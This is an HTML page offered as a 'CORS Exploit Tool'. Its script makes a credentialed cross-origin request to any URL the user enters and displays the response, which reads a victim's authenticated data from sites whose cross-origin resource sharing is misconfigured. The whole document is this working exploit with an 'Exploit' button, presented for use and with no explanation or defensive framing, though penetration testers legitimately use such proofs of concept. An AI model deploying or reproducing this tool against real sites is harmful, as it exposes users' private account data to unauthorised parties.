<!doctype html>
<html>
    <head>
        <title>CORS Exploit Tool</title>
        <style>
            #data{display:none;}
        </style>

        <script>
            function cors() {
                var url = document.getElementById("url").value;
                url= url.trim();
                if(url.length > 3){
                    document.getElementById("data").style.display = "none";
                    var xhttp = new XMLHttpRequest();
                    xhttp.onreadystatechange = function() {
                        if (this.readyState == 4 && this.status == 200) {
                            document.getElementById("data").style.display = "block";
                            document.getElementById("data").innerHTML = this.responseText;
                        }else{
                            document.getElementById("data").style.display = "block";
                            document.getElementById("data").innerHTML = "Not Found";
                        }
                    };
                    xhttp.open("GET", url, true);
                    xhttp.withCredentials = true;
                    xhttp.send();
                }else{
                    document.getElementById("data").style.display = "none";
                }
            }
        </script>

    </head>

    <body>
        <center style="margin-top:30px;">
            <h2 style="font-family:arial;color:#666666;">CORS Exploit</h2>
            <input type="text" id="url" style="width:250px;padding:5px;border-radius:5px;border:1px solid #b3b3b3;">
            <button type="button" onclick="cors()" style="padding:5px 15px;cursor:pointer;border-radius:6px;border:none;background:#00b386;color:white;font-size:16px;">Exploit</button><br/><br/><br/>
            <textarea disabled id="data" style="width:800px;height:500px;"></textarea>
        </center>


    </body>
</html>
